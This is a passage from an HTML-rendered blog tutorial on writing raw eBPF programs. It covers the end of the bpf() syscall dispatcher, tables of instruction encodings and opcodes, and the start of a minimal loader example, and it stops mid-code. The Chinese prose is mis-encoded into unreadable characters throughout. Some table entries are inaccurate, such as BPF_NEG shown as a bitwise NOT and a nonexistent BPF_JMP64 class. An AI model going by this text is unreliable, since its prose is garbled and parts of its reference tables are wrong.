err;<br><br><span class="hljs-keyword">switch</span> (cmd) &#123;<br><span class="hljs-keyword">case</span> BPF_MAP_CREATE:<br>err = map_create(&amp;attr);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-comment">//...</span><br><span class="hljs-keyword">default</span>:<br>err = -EINVAL;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br><span class="hljs-keyword">return</span> err;<br>&#125;<br><br>SYSCALL_DEFINE3(bpf, <span class="hljs-type">int</span>, cmd, <span class="hljs-keyword">union</span> bpf_attr __user *, uattr, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>, size)<br>&#123;<br><span class="hljs-keyword">return</span> __sys_bpf(cmd, USER_BPFPTR(uattr), size);<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="0x03-raw-eBPF-ç¨‹åºç¼–å†™å…¥é—¨"><a href="#0x03-raw-eBPF-ç¨‹åºç¼–å†™å…¥é—¨" class="headerlink" title="0x03. raw eBPF ç¨‹åºç¼–å†™å…¥é—¨"></a>0x03. raw eBPF ç¨‹åºç¼–å†™å…¥é—¨</h1><p>ç”±äº eBPF ç›¸å…³çš„å„ç§æ“ä½œå®é™…ä¸Šéƒ½æ˜¯é€šè¿‡ <code>bpf()</code> ç³»ç»Ÿè°ƒç”¨å®Œæˆçš„ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡ç›´æ¥è°ƒç”¨ <code>bpf()</code> ç³»ç»Ÿè°ƒç”¨æ¥æ„Ÿå— eBPF çš„é­…åŠ›ï¼šï¼‰</p><blockquote><p>æ³¨ï¼šåœ¨ eBPF çš„å®é™…åº”ç”¨ä¸­å¾ˆå°‘ä¼šç›´æ¥å†™ raw BPF æŒ‡ä»¤ï¼Œè€Œæ˜¯ä¼šå€ŸåŠ©è¯¸å¦‚ <code>bcc</code> è¿™æ ·çš„å„ç±»å·¥å…·ï¼Œä¸è¿‡é‚£ä¸æ˜¯è¿™ä¸€ç¯‡åšå®¢çš„é‡ç‚¹ï¼šï¼‰</p><blockquote><p>æœ‰æ—¶é—´çš„è¯å†åœ¨åé¢çš„åšå®¢ä¸­ç®€å•è®²è®²ï¼ˆ</p></blockquote></blockquote><blockquote><p>æ³¨2ï¼šå†…æ ¸åœ¨ <code>/samples/bpf</code> ç›®å½•ä¸‹æä¾›äº†å¾ˆå¤šå¸®åŠ©æˆ‘ä»¬å¿«é€Ÿç¼–å†™ eBPF ç¨‹åºçš„å·¥å…·ä¸ä¸€äº›ç¤ºä¾‹ï¼Œå…¶ä¸­ <code>/samples/bpf/bpf_insn.h</code> æ–‡ä»¶<strong>æä¾›äº†å°è£…å¥½çš„å„ç±»æŒ‡ä»¤æ¨¡æ¿</strong> ï¼šï¼‰</p></blockquote><h2 id="ä¸€ã€eBPF-æŒ‡ä»¤æ ¼å¼"><a href="#ä¸€ã€eBPF-æŒ‡ä»¤æ ¼å¼" class="headerlink" title="ä¸€ã€eBPF æŒ‡ä»¤æ ¼å¼"></a>ä¸€ã€eBPF æŒ‡ä»¤æ ¼å¼</h2><p>eBPF ä¸ºä¼˜é›…çš„ RISC æŒ‡ä»¤é›†ï¼ˆ<del>è¿™å°±è¦è¯´åˆ° Intel CISC çš„å«å±é‡äº†</del>ï¼‰ï¼Œå•æ¡æŒ‡ä»¤é•¿åº¦ä¸º 8 å­—èŠ‚ï¼Œå®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn</span> &#123;</span><br>__u8code;<span class="hljs-comment">/* æ“ä½œç  */</span><br>__u8dst_reg:<span class="hljs-number">4</span>;<span class="hljs-comment">/* ç›®çš„å¯„å­˜å™¨ */</span><br>__u8src_reg:<span class="hljs-number">4</span>;<span class="hljs-comment">/* æºå¯„å­˜å™¨ */</span><br>__s16off;<span class="hljs-comment">/* æœ‰ç¬¦å·åç§» */</span><br>__s32imm;<span class="hljs-comment">/* æœ‰ç¬¦å·ç«‹å³æ•° */</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>è€Œ eBPF å®é™…ä¸Šæœ‰ä¸¤ç§ç¼–ç æ¨¡å¼ï¼š</p><ul><li>åŸºç¡€ç¼–ç ï¼Œå•æ¡æŒ‡ä»¤ä¸º 64 bit</li><li>å®½æŒ‡ä»¤ç¼–ç ï¼Œ <em>åœ¨åŸºç¡€ç¼–ç åæ·»åŠ ä¸€ä¸ª 64bit çš„ç«‹å³æ•°</em> ï¼Œå•æ¡æŒ‡ä»¤ä¸º 128 bit</li></ul><p>åŸºç¡€ç¼–ç çš„æŒ‡ä»¤æ ¼å¼å¦‚ä¸‹ï¼š</p><table><thead><tr><th align="center">é•¿åº¦</th><th align="center">8 bits</th><th align="center">4 bits</th><th align="center">4 bits</th><th align="center">16 bits</th><th align="center">32 bits</th></tr></thead><tbody><tr><td align="center">å«ä¹‰</td><td align="center">opcode(æ“ä½œç )</td><td align="center">dst_reg(ç›®çš„å¯„å­˜å™¨)</td><td align="center">src_reg(æºå¯„å­˜å™¨)</td><td align="center">off(æœ‰ç¬¦å·åç§»)</td><td align="center">imm(æœ‰ç¬¦å·32ä½ç«‹å³æ•°)</td></tr></tbody></table><p>eBPF æŒ‡ä»¤ä¸­çš„ <code>opcode</code> åŸŸé•¿åº¦ä¸º 8 bitï¼Œå…¶ä¸­<strong>ä½ 3 ä½å›ºå®šè¡¨ç¤ºæŒ‡ä»¤ç±»å‹</strong>ï¼Œå‰©ä¸‹çš„é«˜ 5 ä½æ ¹æ®ç±»å‹ä¸åŒç”¨é€”ä¹Ÿä¸åŒ</p><p>æŒ‡ä»¤ç±»å‹å¦‚ä¸‹è¡¨æ‰€ç¤ºï¼š </p><table><thead><tr><th align="center">ç±»å‹</th><th align="center">å€¼</th><th align="center">æè¿°</th></tr></thead><tbody><tr><td align="center">BPF_LD</td><td align="center">0x00</td><td align="center">åªèƒ½ç”¨äºå®½æŒ‡ä»¤ï¼Œä» <code>imm64</code> ä¸­åŠ è½½æ•°æ®åˆ°å¯„å­˜å™¨</td></tr><tr><td align="center">BPF_LDX</td><td align="center">0x01</td><td align="center">ä»å†…å­˜ä¸­åŠ è½½æ•°æ®åˆ° <code>dst_reg</code></td></tr><tr><td align="center">BPF_ST</td><td align="center">0x02</td><td align="center">æŠŠ <code>imm32</code> æ•°æ®ä¿å­˜åˆ°å†…å­˜ä¸­</td></tr><tr><td align="center">BPF_STX</td><td align="center">0x03</td><td align="center">æŠŠ <code>src_reg</code> å¯„å­˜å™¨æ•°æ®ä¿å­˜åˆ°å†…å­˜</td></tr><tr><td align="center">BPF_ALU</td><td align="center">0x04</td><td align="center">32bit ç®—æœ¯è¿ç®—</td></tr><tr><td align="center">BPF_JMP</td><td align="center">0x05</td><td align="center">64bit è·³è½¬æ“ä½œ</td></tr><tr><td align="center">BPF_JMP32</td><td align="center">0x06</td><td align="center">32bit è·³è½¬æ“ä½œ</td></tr><tr><td align="center">BPF_ALU64</td><td align="center">0x07</td><td align="center">64bit ç®—æœ¯è¿ç®—</td></tr></tbody></table><blockquote><p>æ³¨ï¼šåœ¨ classic BPF ä¸­ <code>0x06</code> ä¸ºå‡½æ•°è¿”å›æŒ‡ä»¤ <code>BPF_RET</code> ï¼Œ<code>0x07</code> ä¸ºå¯„å­˜å™¨äº¤æ¢æŒ‡ä»¤ <code>BPF_MISC</code> ï¼ˆcBPF åªæœ‰ <code>A</code> å’Œ <code>X</code> ä¸¤ä¸ªå¯„å­˜å™¨ï¼‰</p></blockquote><p><img src="https://s2.loli.net/2023/05/29/ctkw1sIlfAYp8Hz.png" alt="æˆ‘è¶…,__ï¼.png"></p><h3 id="ç®—æœ¯-amp-è·³è½¬æŒ‡ä»¤"><a href="#ç®—æœ¯-amp-è·³è½¬æŒ‡ä»¤" class="headerlink" title="ç®—æœ¯ &amp; è·³è½¬æŒ‡ä»¤"></a>ç®—æœ¯ &amp; è·³è½¬æŒ‡ä»¤</h3><p>å¯¹äºç®—æœ¯ &amp; è·³è½¬æŒ‡ä»¤è€Œè¨€ç”±é«˜ä½åˆ°ä½ä½åˆ†ä¸ºä¸‰ä¸ªéƒ¨åˆ†ï¼š</p><table><thead><tr><th align="center">4 bit</th><th align="center">1 bit</th><th align="center">3 bit</th></tr></thead><tbody><tr><td align="center">operation code ï¼ˆæ“ä½œä»£ç ï¼‰</td><td align="center">sourceï¼ˆæºï¼‰</td><td align="center">instruction class ï¼ˆæŒ‡ä»¤ç±»å‹ï¼‰</td></tr></tbody></table><h4 id="â‘ -æ“ä½œä»£ç "><a href="#â‘ -æ“ä½œä»£ç " class="headerlink" title="â‘  æ“ä½œä»£ç "></a>â‘  æ“ä½œä»£ç </h4><p>opcode çš„<strong>æœ€é«˜ 4 bit ç”¨æ¥ä¿å­˜æ“ä½œä»£ç </strong>ï¼Œå¯¹äºç®—æœ¯æŒ‡ä»¤è€Œè¨€æœ‰å¦‚ä¸‹ç±»å‹ï¼š</p><table><thead><tr><th align="center">æŒ‡ä»¤ç±»å‹</th><th align="center">æ“ä½œä»£ç </th><th align="center">å€¼</th><th>æè¿°</th></tr></thead><tbody><tr><td align="center">BPF_ALU &#x2F; BPF_ALU64</td><td align="center">BPF_ADD</td><td align="center">0x00</td><td>dst +&#x3D; src</td></tr><tr><td align="center">BPF_ALU &#x2F; BPF_ALU64</td><td align="center">BPF_SUB</td><td align="center">0x10</td><td>dst -&#x3D; src</td></tr><tr><td align="center">BPF_ALU &#x2F; BPF_ALU64</td><td align="center">BPF_MUL</td><td align="center">0x20</td><td>dst *&#x3D; src</td></tr><tr><td align="center">BPF_ALU &#x2F; BPF_ALU64</td><td align="center">BPF_DIV</td><td align="center">0x30</td><td>dst &#x2F;&#x3D; src</td></tr><tr><td align="center">BPF_ALU &#x2F; BPF_ALU64</td><td align="center">BPF_OR</td><td align="center">0x40</td><td>dst |&#x3D; src</td></tr><tr><td align="center">BPF_ALU &#x2F; BPF_ALU64</td><td align="center">BPF_AND</td><td align="center">0x50</td><td>dst &amp;&#x3D; src</td></tr><tr><td align="center">BPF_ALU &#x2F; BPF_ALU64</td><td align="center">BPF_LSH</td><td align="center">0x60</td><td>dst &lt;&lt;&#x3D; src</td></tr><tr><td align="center">BPF_ALU &#x2F; BPF_ALU64</td><td align="center">BPF_RSH</td><td align="center">0x70</td><td>dst &gt;&gt;&#x3D; src</td></tr><tr><td align="center">BPF_ALU &#x2F; BPF_ALU64</td><td align="center">BPF_NEG</td><td align="center">0x80</td><td>dst &#x3D; ~src</td></tr><tr><td align="center">BPF_ALU &#x2F; BPF_ALU64</td><td align="center">BPF_MOD</td><td align="center">0x90</td><td>dst %&#x3D; src</td></tr><tr><td align="center">BPF_ALU &#x2F; BPF_ALU64</td><td align="center">BPF_XOR</td><td align="center">0xA0</td><td>dst ^&#x3D; src</td></tr><tr><td align="center">BPF_ALU &#x2F; BPF_ALU64</td><td align="center">BPF_MOV</td><td align="center">0xB0</td><td>dst &#x3D; src</td></tr><tr><td align="center">BPF_ALU &#x2F; BPF_ALU64</td><td align="center">BPF_ARSH</td><td align="center">0xC0</td><td>ç®—æœ¯å³ç§»æ“ä½œï¼ˆæ­£æ•°è¡¥ 0 è´Ÿæ•°è¡¥ 1 ï¼‰</td></tr><tr><td align="center">BPF_ALU &#x2F; BPF_ALU64</td><td align="center">BPF_END</td><td align="center">0xD0</td><td>å­—èŠ‚åºè½¬æ¢</td></tr></tbody></table><p>å¯¹äºè·³è½¬æŒ‡ä»¤è€Œè¨€æœ‰å¦‚ä¸‹ç±»å‹ï¼š</p><table><thead><tr><th align="center"><strong>æŒ‡ä»¤ç±»å‹</strong></th><th align="center"><strong>æ“ä½œä»£ç </strong></th><th align="center"><strong>å€¼</strong></th><th><strong>æè¿°</strong></th><th>å¤‡æ³¨</th></tr></thead><tbody><tr><td align="center">BPF_JMP</td><td align="center">BPF_JA</td><td align="center">0x00</td><td>PC +&#x3D; off</td><td>ä»…ç”¨äº BPF_JMP</td></tr><tr><td align="center">BPF_JMP &#x2F; BPF_JMP64</td><td align="center">BPF_JEQ</td><td align="center">0x10</td><td>PC +&#x3D; off if dst &#x3D;&#x3D; src</td><td></td></tr><tr><td align="center">BPF_JMP &#x2F; BPF_JMP64</td><td align="center">BPF_JGT</td><td align="center">0x20</td><td>PC +&#x3D; off if dst &gt; src</td><td></td></tr><tr><td align="center">BPF_JMP &#x2F; BPF_JMP64</td><td align="center">BPF_JGE</td><td align="center">0x30</td><td>PC +&#x3D; off if dst &gt;&#x3D; src</td><td></td></tr><tr><td align="center">BPF_JMP &#x2F; BPF_JMP64</td><td align="center">BPF_JSET</td><td align="center">0x40</td><td>PC +&#x3D; off if dst &amp; src</td><td></td></tr><tr><td align="center">BPF_JMP &#x2F; BPF_JMP64</td><td align="center">BPF_JNE</td><td align="center">0x50</td><td>PC +&#x3D; off if dst !&#x3D; src</td><td>ä»… eBPFï¼šä¸ç­‰æ—¶è·³è½¬</td></tr><tr><td align="center">BPF_JMP &#x2F; BPF_JMP64</td><td align="center">BPF_JSGT</td><td align="center">0x60</td><td>PC +&#x3D; off if dst &gt; src</td><td>ä»… eBPFï¼šæœ‰ç¬¦å· â€˜&gt;â€™</td></tr><tr><td align="center">BPF_JMP &#x2F; BPF_JMP64</td><td align="center">BPF_JSGE</td><td align="center">0x70</td><td>PC +&#x3D; off if dst &gt;&#x3D; src</td><td>ä»… eBPFï¼šæœ‰ç¬¦å· â€˜&gt;&#x3D;â€™</td></tr><tr><td align="center">BPF_JMP &#x2F; BPF_JMP64</td><td align="center">BPF_CALL</td><td align="center">0x80</td><td>å‡½æ•°è°ƒç”¨</td><td>ä»… eBPFï¼šå‡½æ•°è°ƒç”¨</td></tr><tr><td align="center">BPF_JMP &#x2F; BPF_JMP64</td><td align="center">BPF_EXIT</td><td align="center">0x90</td><td>å‡½æ•°æˆ–è€…ç¨‹åºè¿”å›</td><td>ä»… eBPFï¼šå‡½æ•°è¿”å›</td></tr><tr><td align="center">BPF_JMP &#x2F; BPF_JMP64</td><td align="center">BPF_JLT</td><td align="center">0xA0</td><td>PC +&#x3D; off if dst &lt; src</td><td>ä»… eBPFï¼šæ— ç¬¦å· â€˜&lt;â€™</td></tr><tr><td align="center">BPF_JMP &#x2F; BPF_JMP64</td><td align="center">BPF_JLE</td><td align="center">0xB0</td><td>PC +&#x3D; off if dst &lt;&#x3D; src</td><td>ä»… eBPFï¼šæ— ç¬¦å· â€˜&lt;&#x3D;â€™</td></tr><tr><td align="center">BPF_JMP &#x2F; BPF_JMP64</td><td align="center">BPF_JSLT</td><td align="center">0xC0</td><td>PC +&#x3D; off if dst &lt; src</td><td>ä»… eBPFï¼šæœ‰ç¬¦å· â€˜&lt;â€™</td></tr><tr><td align="center">BPF_JMP &#x2F; BPF_JMP64</td><td align="center">BPF_JSLE</td><td align="center">0xD0</td><td>PC +&#x3D; off if dst &lt;&#x3D; src</td><td>ä»… eBPFï¼šæœ‰ç¬¦å· â€˜&lt;&#x3D;â€™</td></tr></tbody></table><h4 id="â‘¡-æº"><a href="#â‘¡-æº" class="headerlink" title="â‘¡ æº"></a>â‘¡ æº</h4><p>opcode ä¸­é—´çš„ä¸€ä¸ª bit ç”¨æ¥è¡¨ç¤º <strong>æº</strong> ï¼Œå¯¹äºæ™®é€šçš„è·³è½¬ä¸ç®—æœ¯æŒ‡ä»¤è€Œè¨€å«ä¹‰å¦‚ä¸‹è¡¨ï¼š</p><table><thead><tr><th align="center">æŒ‡ä»¤ç±»å‹</th><th align="center">æº</th><th align="center">å€¼</th><th>æè¿°</th></tr></thead><tbody><tr><td align="center">BPF_ALU &#x2F; BPF_ALU64 &#x2F; BPF_JMP &#x2F; BPF_JMP64</td><td align="center">BPF_K</td><td align="center">0x00</td><td>ä½¿ç”¨32-bit <code>imm32</code> ä½œä¸ºæºæ“ä½œæ•°</td></tr><tr><td align="center">BPF_ALU &#x2F; BPF_ALU64 &#x2F; BPF_JMP &#x2F; BPF_JMP64</td><td align="center">BPF_X</td><td align="center">0x08</td><td>ä½¿ç”¨æºå¯„å­˜å™¨ ï¼ˆ<code>src_reg</code>ï¼‰ ä½œä¸ºæºæ“ä½œæ•°</td></tr></tbody></table><p>å¯¹äº <code>BPF_END</code> æ“ä½œç è€Œè¨€å«ä¹‰å¦‚ä¸‹ï¼š</p><table><thead><tr><th align="center">æŒ‡ä»¤ç±»å‹</th><th align="center">æ“ä½œä»£ç </th><th align="center">æº</th><th>å€¼</th><th>æè¿°</th></tr></thead><tbody><tr><td align="center">BPF_ALU &#x2F; BPF_ALU64</td><td align="center">BPF_END</td><td align="center">BPF_TO_LE</td><td>0x00</td><td>è½¬ä¸ºå°ç«¯åº</td></tr><tr><td align="center">BPF_ALU &#x2F; BPF_ALU64</td><td align="center">BPF_END</td><td align="center">BPF_TO_BE</td><td>0x08</td><td>è½¬ä¸ºå¤§ç«¯åº</td></tr></tbody></table><h3 id="Load-amp-Store-æŒ‡ä»¤"><a href="#Load-amp-Store-æŒ‡ä»¤" class="headerlink" title="Load &amp; Store æŒ‡ä»¤"></a>Load &amp; Store æŒ‡ä»¤</h3><p>å¯¹äº Load &amp; Store æŒ‡ä»¤è€Œè¨€ï¼Œopcode ç”±é«˜åˆ°ä½åˆ†ä¸ºå¦‚ä¸‹ä¸‰éƒ¨åˆ†ï¼š</p><table><thead><tr><th align="center">3 bits</th><th align="center">2 bit</th><th align="center">3 bits</th></tr></thead><tbody><tr><td align="center">modeï¼ˆæ¨¡å¼ï¼‰</td><td align="center">sizeï¼ˆå¤§å°ï¼‰</td><td align="center">instruction class ï¼ˆæŒ‡ä»¤ç±»å‹ï¼‰</td></tr></tbody></table><h4 id="â‘ -å¤§å°"><a href="#â‘ -å¤§å°" class="headerlink" title="â‘  å¤§å°"></a>â‘  å¤§å°</h4><p> Load &amp; Store æŒ‡ä»¤çš„ <strong>size</strong> åŸŸç”¨æ¥è¡¨ç¤º<strong>æ“ä½œçš„å­—èŠ‚æ•°</strong>ï¼š</p><blockquote><p>ä¸çŸ¥é“ä¸ºå•¥æ’åºè®¾ä¸º 4 2 1 8 :ï¼ˆ</p></blockquote><table><thead><tr><th align="center">å¤§å°</th><th align="center">å€¼</th><th align="center">æè¿°</th></tr></thead><tbody><tr><td align="center">BPF_W</td><td align="center">0x00</td><td align="center">å•å­—ï¼ˆ4 å­—èŠ‚ï¼‰</td></tr><tr><td align="center">BPF_H</td><td align="center">0x08</td><td align="center">åŠå­—ï¼ˆ2å­—èŠ‚ï¼‰</td></tr><tr><td align="center">BPF_B</td><td align="center">0x10</td><td align="center">å•å­—èŠ‚ï¼ˆ1å­—èŠ‚ï¼‰</td></tr><tr><td align="center">BPF_DW</td><td align="center">0x18</td><td align="center">åŒå­—ï¼ˆ8å­—èŠ‚ï¼‰</td></tr></tbody></table><h4 id="â‘¡-æ¨¡å¼"><a href="#â‘¡-æ¨¡å¼" class="headerlink" title="â‘¡ æ¨¡å¼"></a>â‘¡ æ¨¡å¼</h4><p> Load &amp; Store æŒ‡ä»¤çš„ <strong>mode</strong> åŸŸç”¨æ¥è¡¨ç¤º<strong>æ“ä½œçš„æ¨¡å¼</strong>ï¼Œä¹Ÿå°±æ˜¯å¦‚ä½•å»æ“ä½œæŒ‡å®šå¤§å°çš„æ•°æ®ï¼š</p><table><thead><tr><th align="center">æ¨¡å¼</th><th align="center">å€¼</th><th align="center">æè¿°</th><th align="center">å¤‡æ³¨</th></tr></thead><tbody><tr><td align="center">BPF_IMM</td><td align="center">0x00</td><td align="center">64 ä½ç«‹å³æ•°</td><td align="center">eBPF ä¸º64 ä½ç«‹å³æ•°ï¼ŒcBPF ä¸­ä¸º 32 ä½</td></tr><tr><td align="center">BPF_ABS</td><td align="center">0x20</td><td align="center">æ•°æ®åŒ…ç›´æ¥è®¿é—®</td><td align="center">å…¼å®¹è‡ª cBPF æŒ‡ä»¤ã€‚R6 ä½œä¸ºéšå¼è¾“å…¥ï¼Œå­˜æ”¾ <code>struct *sk_buff</code> ï¼›R0 ä½œä¸ºéšå¼è¾“å‡ºï¼Œå­˜æ”¾åŒ…ä¸­è¯»å‡ºæ•°æ®ï¼›R1 ~ R5 ä½œä¸º scratch registersï¼Œåœ¨æ¯æ¬¡è°ƒç”¨åä¼šè¢«æ¸…ç©º</td></tr><tr><td align="center">BPF_IND</td><td align="center">0x40</td><td align="center">æ•°æ®åŒ…é—´æ¥è®¿é—®</td><td align="center">åŒ BPF_ABS</td></tr><tr><td align="center">BPF_MEM</td><td align="center">0x60</td><td align="center">èµ‹å€¼ç»™ *(size *)(dst_reg + off)</td><td align="center">æ ‡å‡† load &amp; store æ“ä½œ</td></tr><tr><td align="center">BPF_LEN</td><td align="center">0x80</td><td align="center">ä¿ç•™æŒ‡ä»¤</td><td align="center">ä»…ç”¨äº cBPF</td></tr><tr><td align="center">BPF_MSH</td><td align="center">0xA0</td><td align="center">ä¿ç•™æŒ‡ä»¤</td><td align="center">ä»…ç”¨äº cBPF</td></tr><tr><td align="center">BPF_XADD</td><td align="center">0xC0</td><td align="center">åŸå­æ“ä½œï¼Œ*(æ— ç¬¦å·ç±»å‹ *)(dst_reg + off16) è¿ç®—&#x3D; src_reg</td><td align="center">ä»…ç”¨äº eBPFï¼Œä¸æ”¯æŒ 1 &#x2F; 2 å­—èŠ‚æ›¹ç¥–</td></tr></tbody></table><p>å¯¹äº <code>BPF_XADD</code>ï¼Œ <code>imm32</code> åŸŸè¢«ç”¨æ¥è¡¨ç¤ºåŸå­æ“ä½œçš„è¿ç®—ç±»å‹ï¼š</p><table><thead><tr><th align="center">imm32</th><th align="center">å€¼</th><th align="center">æè¿°</th></tr></thead><tbody><tr><td align="center">BPF_ADD</td><td align="center">0x00</td><td align="center">åŸå­åŠ </td></tr><tr><td align="center">BPF_OR</td><td align="center">0x40</td><td align="center">åŸå­æˆ–</td></tr><tr><td align="center">BPF_AND</td><td align="center">0x50</td><td align="center">åŸå­ä¸</td></tr><tr><td align="center">BPF_XOR</td><td align="center">0xa0</td><td align="center">åŸå­å¼‚æˆ–</td></tr></tbody></table><blockquote><p><del>åæ­£ğŸ‘´çœ‹å¾—æ˜¯æœ‰ç‚¹å¤´å¤§çš„</del></p></blockquote><h2 id="äºŒã€raw-eBPF-ç¨‹åºç¼–å†™"><a href="#äºŒã€raw-eBPF-ç¨‹åºç¼–å†™" class="headerlink" title="äºŒã€raw eBPF ç¨‹åºç¼–å†™"></a>äºŒã€raw eBPF ç¨‹åºç¼–å†™</h2><p>ä¸€ä¸ªæœ€ç®€å•çš„ eBPF ç¨‹åº<strong>ä¾¿æ˜¯ä¸€ä¸ª</strong> <code>bpf_insn</code> <strong>ç»“æ„ä½“æ•°ç»„</strong>ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥åœ¨ç”¨æˆ·æ€ä¸‹ç¼–å†™ä¸€ä¸ª <code>bpf_insn</code> ç»“æ„ä½“æ•°ç»„å¹¶ç›´æ¥è°ƒç”¨ <code>bpf()</code> ç³»ç»Ÿè°ƒç”¨å®Œæˆ eBPF ç¨‹åºçš„åˆ›å»ºä¸æŒ‚è½½ï¼šï¼‰</p><p>æœ€ç®€å•çš„æ–¹æ³•ä¾¿æ˜¯ç›´æ¥æŒ‰å¦‚ä¸‹å½¢å¼å®šä¹‰ä¸€æ¡åŸºæœ¬çš„ eBPF æŒ‡ä»¤ï¼š</p><blockquote><p> æ³¨ï¼šè¿™é‡Œå¯ä»¥ç›´æ¥ä½¿ç”¨å†…æ ¸æºç ç›®å½•ä¸‹æä¾›çš„ <code>/samples/bpf/bpf_insn.h</code> ï¼šï¼‰</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> BPF_RAW_INSN(CODE, DST, SRC, OFF, IMM)        \</span><br><span class="hljs-meta">    ((struct bpf_insn) &#123;                              \</span><br><span class="hljs-meta">        .code         = CODE,                         \</span><br><span class="hljs-meta">        .dst_reg     = DST,                           \</span><br><span class="hljs-meta">        .src_reg     = SRC,                           \</span><br><span class="hljs-meta">        .off         = OFF,                           \</span><br><span class="hljs-meta">        .imm         = IMM                            \</span><br><span class="hljs-meta">&#125;)</span><br></code></pre></td></tr></table></figure><p>ä¹‹åç›´æ¥å¼€å†™å°±è¡Œï¼Œéœ€è¦æ³¨æ„çš„æ˜¯æˆ‘ä»¬åº”å½“ä»¥ä¸€æ¡ <code>è·³è½¬ç»“æŸæŒ‡ä»¤</code> ï¼ˆopcode ä¸º <code>BPF_JMP | BPF_EXIT</code> ï¼‰ä½œä¸ºç»“å°¾ï¼Œä¸‹é¢æ˜¯ä¸€ä¸ªğŸŒ°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/bpf.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">err_exit</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BPF_RAW_INSN(CODE, DST, SRC, OFF, IMM)          \</span><br><span class="hljs-meta">    ((struct bpf_insn) &#123;                                \</span><br><span class="hljs-meta">        .code        = CODE,                            \</span><br><span class="hljs-meta">        .dst_reg     = DST,                             \</span><br><span class="hljs-meta">        .src_reg     = SRC,                             \</span><br><span class="hljs-meta">        .off         = OFF,                             \</span><br><span class="hljs-meta">        .imm         = IMM                              \</span><br><span class="hljs-meta">&#125;)</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn</span> <span class="hljs-title">test_bpf_prog</span>[] =</span> &#123;<br>    BPF_RAW_INSN(BPF_ALU64 | BPF_MOV | BPF_K, BPF_REG_0, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0x114514</span>),<br>    BPF_RAW_INSN(BPF_JMP | BPF_EXIT, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>),<br>&#125;;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TEST_BPF_LOG_SZ 0x10000</span><br><span class="hljs-type">char</span> test_bpf_log_buf[TEST_BPF_LOG_SZ] = &#123; <span class="hljs-string">&#x27;\0&#x27;</span> &#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span 